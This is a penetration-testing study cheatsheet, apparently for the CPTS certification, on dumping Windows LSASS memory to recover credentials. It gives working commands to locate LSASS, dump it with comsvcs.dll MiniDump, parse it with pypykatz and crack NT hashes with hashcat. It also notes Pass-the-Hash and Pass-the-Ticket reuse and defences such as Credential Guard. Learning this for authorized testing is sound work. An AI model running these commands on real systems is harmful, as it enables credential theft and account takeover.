# Attacking LSASS — CPTS Cheatsheet

**Core idea:** LSASS is a live Windows security process that can retain credential material for active logon sessions. Dump it → analyze the dump offline → identify usable credential artifacts.

---

## 1. Core Workflow

```
Privileged Windows access
        ↓
Identify LSASS PID
        ↓
Create LSASS memory dump
        ↓
Transfer dump to attack machine
        ↓
Pypykatz
        ↓
Analyze: MSV / WDigest / Kerberos / DPAPI
        ↓
Use / crack recovered credential material
```

---

## 2. Why Target LSASS?

```
SAM                 → local account credential database
LSASS               → active-session credential material
NTDS.dit            → Active Directory database
Credential Manager  → saved credentials
```

```
SAM      → LOCAL / DISK
LSASS    → LIVE / MEMORY
NTDS     → DOMAIN / DISK
CredMan  → SAVED
```

---

## 3. Find LSASS PID

CMD:

```cmd
tasklist /svc
```

Look for `lsass.exe` — e.g. `lsass.exe   672   KeyIso, SamSs, VaultSvc` → PID = 672.

PowerShell:

```powershell
Get-Process lsass
```

Look at the `Id` column.

---

## 4. Create LSASS Dump — Task Manager (GUI)

```
Task Manager
 ↓
Processes
 ↓
Local Security Authority Process
 ↓
Right-click → Create dump file
```

Dump lands in `%TEMP%` (e.g. `lsass.DMP`). Transfer it to the attack machine.

---

## 5. Create LSASS Dump — Command Line

Requires sufficiently privileged/elevated access.

```cmd
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

Example:

```cmd
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

```
rundll32 → comsvcs.dll → MiniDump → LSASS PID → lsass.dmp
```

> Modern AV/EDR may detect/block this behavior. A successful shell does not automatically mean you're authorized to dump LSASS — get authorization first.

---

## 6. Transfer the Dump

Move `lsass.dmp` from target → attack machine (smbserver.py share, same as SAM/SYSTEM hives).

```
TARGET       → collect dump
ATTACK BOX   → analyze offline
```

---

## 7. Pypykatz

```bash
pypykatz lsa minidump /path/to/lsass.dmp
```

```
lsass.dmp → Pypykatz → LogonSessions → credential artifacts
```

---

## 8. LogonSession Fields

```
authentication_id
luid
session_id
username
domainname
sid
logon_server
logon_time
```

Think: *Who? Which domain? Which SID? Which session? When?*

**LUID** = locally unique identifier, links a logon session. Not itself a password.

**SID** — e.g. `S-1-5-21-...-1001` — security principal identifier used in Windows security decisions.

---

## 9. MSV

```
== MSV ==
Username: bob
Domain: DESKTOP-...
LM: NA
NT: <NT_HASH>
SHA1: <SHA1>
```

`NT: <NT_HASH>` is the important field — the NT password hash.

```bash
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

NT hash ≠ plaintext — Hashcat recovers it via candidate testing (candidate → NT hash calc → compare).

---

## 10. WDigest

```
== WDIGEST ==
username bob
domainname ...
password None
```

Legacy concern: older WDigest configs could keep plaintext in LSASS. Modern Windows: not present by default. **WDigest ≠ "always plaintext"** — check `UseLogonCredential`.

---

## 11. Kerberos

```
== Kerberos ==
Username: bob
Domain: ...
```

May include TGTs, service tickets, session/encryption keys.

```
Domain user → Kerberos → tickets → LSASS
```

Feeds later attacks: Pass-the-Ticket, Kerberoasting.

---

## 12. DPAPI

```
== DPAPI ==
masterkey ...
sha1_masterkey ...
```

```
DPAPI-protected secret → masterkey/user context → decryption → usable secret
```

---

## 13. Multiple LogonSessions

Seeing the same username multiple times (`bob`, `bob`, `DWM-2`...) is normal — interactive login, RDP, RunAs, services, and scheduled tasks each get their own session.

---

## 14. What LSASS Can Potentially Give You

```
NT hash
LM hash
Kerberos tickets
Kerberos keys/material
Legacy WDigest credentials
DPAPI material
other authentication/session data
```

Don't assume every machine exposes all of them.

---

## 15. LSASS vs SAM vs NTDS.dit

```
SAM    → disk    → C:\Windows\System32\config\SAM → local account credential material
LSASS  → memory  → lsass.exe → active logon/session credential material
NTDS   → disk    → Active Directory database → domain accounts, DC only
```

---

## 16. Credential Material May Not Need Cracking

```
Recovered artifact → Does it need cracking?
```

Not always — an NT hash may be directly usable for Pass-the-Hash; a Kerberos ticket may be usable without ever recovering plaintext (Pass-the-Ticket).

---

## 17. Modern Defenses

**LSA Protection (RunAsPPL)** — prevents unauthorized memory access/code injection against LSA/LSASS.

**Credential Guard** — VBS-isolates sensitive authentication secrets away from regular LSASS memory.

```
Traditional:      credentials → lsass.exe memory
Credential Guard: credentials → isolated LSA environment
```

```
LSASS dump ≠ guaranteed credentials.
```

A hardened system may expose much less.

---

## 18. Must-Remember Commands

Find LSASS:

```cmd
tasklist /svc
```
```powershell
Get-Process lsass
```

Dump LSASS (lab/authorized):

```cmd
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

Parse dump:

```bash
pypykatz lsa minidump /path/to/lsass.dmp
```

Crack NT hash:

```bash
hashcat -m 1000 <NT_HASH> /usr/share/wordlists/rockyou.txt
```

---

## 19. Memory Block

```
ATTACKING LSASS

LSASS → live authentication/session material

Find PID:  tasklist /svc  /  Get-Process lsass
Dump:      rundll32 ... comsvcs.dll, MiniDump <PID> <dump> full
Analyze:   pypykatz lsa minidump <dump>

MSV       → NT/LM-related hashes
WDigest   → legacy cleartext credential possibility
Kerberos  → tickets/keys/authentication material
DPAPI     → protected application/user secrets

NT hash   → Hashcat mode 1000
```

---

## 20. One-Line Mental Model

> LSASS attacks are memory-based credential attacks: dump the active security process, parse the snapshot, identify what authentication material is present, and then crack or otherwise use the recovered artifact.
